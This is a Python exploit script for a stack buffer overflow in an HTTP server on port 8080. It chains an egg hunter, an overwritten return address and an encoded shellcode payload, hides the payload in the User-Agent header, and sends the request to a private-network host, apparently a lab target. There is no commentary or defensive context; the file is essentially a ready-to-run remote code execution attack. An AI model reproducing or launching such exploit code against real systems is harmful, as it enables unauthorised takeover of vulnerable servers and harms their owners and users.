#!/usr/bin/python
 
import socket
import os
import sys
from struct import pack

# junk = "A" * 515
eip = pack("<L", 0x77f31d2f) 
egg_hunter = (
"\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30"
"\x30\x74\x8b\xfa"
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")
junk = "A" * 478

stage1 = junk + egg_hunter + "A"*5 + eip + "\xEB\xC4"

shellcode = (
"\x89\xe5\xdb\xda\xd9\x75\xf4\x58\x50\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x69\x6c\x6d\x38\x6e\x62\x65\x50\x77\x70\x45\x50\x73\x50\x6e"
"\x69\x38\x65\x34\x71\x6b\x70\x61\x74\x4e\x6b\x62\x70\x64\x70"
"\x4c\x4b\x30\x52\x36\x6c\x6c\x4b\x50\x52\x54\x54\x4c\x4b\x52"
"\x52\x31\x38\x66\x6f\x78\x37\x63\x7a\x57\x56\x64\x71\x39\x6f"
"\x4c\x6c\x77\x4c\x61\x71\x31\x6c\x65\x52\x66\x4c\x75\x70\x69"
"\x51\x38\x4f\x56\x6d\x77\x71\x39\x57\x39\x72\x7a\x52\x70\x52"
"\x76\x37\x4e\x6b\x71\x42\x52\x30\x6e\x6b\x32\x6a\x75\x6c\x6e"
"\x6b\x30\x4c\x76\x71\x42\x58\x38\x63\x51\x58\x77\x71\x58\x51"
"\x52\x71\x6e\x6b\x66\x39\x75\x70\x65\x51\x49\x43\x4e\x6b\x71"
"\x59\x65\x48\x4b\x53\x34\x7a\x52\x69\x6e\x6b\x55\x64\x6c\x4b"
"\x77\x71\x79\x46\x50\x31\x79\x6f\x6e\x4c\x39\x51\x58\x4f\x66"
"\x6d\x56\x61\x4f\x37\x55\x68\x6d\x30\x73\x45\x39\x66\x63\x33"
"\x51\x6d\x58\x78\x47\x4b\x63\x4d\x77\x54\x53\x45\x48\x64\x63"
"\x68\x6e\x6b\x61\x48\x31\x34\x56\x61\x4b\x63\x63\x56\x6c\x4b"
"\x54\x4c\x30\x4b\x6c\x4b\x63\x68\x47\x6c\x73\x31\x78\x53\x4c"
"\x4b\x37\x74\x6c\x4b\x77\x71\x68\x50\x6f\x79\x57\x34\x36\x44"
"\x67\x54\x51\x4b\x31\x4b\x35\x31\x73\x69\x31\x4a\x33\x61\x79"
"\x6f\x4b\x50\x63\x6f\x33\x6f\x63\x6a\x4c\x4b\x45\x42\x58\x6b"
"\x6e\x6d\x63\x6d\x31\x7a\x76\x61\x4e\x6d\x6b\x35\x78\x32\x37"
"\x70\x43\x30\x63\x30\x46\x30\x73\x58\x56\x51\x4e\x6b\x62\x4f"
"\x4f\x77\x4b\x4f\x69\x45\x6f\x4b\x4c\x30\x78\x35\x6f\x52\x46"
"\x36\x63\x58\x4d\x76\x4e\x75\x4f\x4d\x4d\x4d\x4b\x4f\x59\x45"
"\x57\x4c\x74\x46\x31\x6c\x67\x7a\x6d\x50\x59\x6b\x79\x70\x52"
"\x55\x75\x55\x4d\x6b\x67\x37\x64\x53\x73\x42\x32\x4f\x61\x7a"
"\x67\x70\x33\x63\x39\x6f\x6e\x35\x73\x53\x33\x51\x52\x4c\x31"
"\x73\x74\x6e\x33\x55\x73\x48\x42\x45\x55\x50\x41\x41")

stage2 = "w00tw00t" + shellcode

buffer = (
"HEAD /" + stage1 + " HTTP/1.1\r\n"
"Host: 172.16.192.163:8080\r\n"
"User-Agent: " + stage2 + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")
 
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("172.16.192.163", 8080))
expl.send(buffer)
expl.close()